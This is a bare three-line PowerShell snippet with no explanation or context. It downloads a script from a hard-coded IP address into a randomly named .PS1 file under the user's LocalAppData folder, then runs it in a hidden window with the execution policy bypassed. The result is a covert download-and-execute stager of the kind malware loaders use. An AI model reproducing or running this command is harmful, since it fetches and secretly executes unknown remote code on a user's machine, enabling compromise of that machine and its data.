$UkvqRHtIr=$env:LocalAppData+'\'+(Get-Random -Minimum 5482 -Maximum 86245)+'.PS1'
irm 'http://10.1.166.227/?tic=1'> $UkvqRHtIr
powershell -Wi HI -ep bypass -f $UkvqRHtIr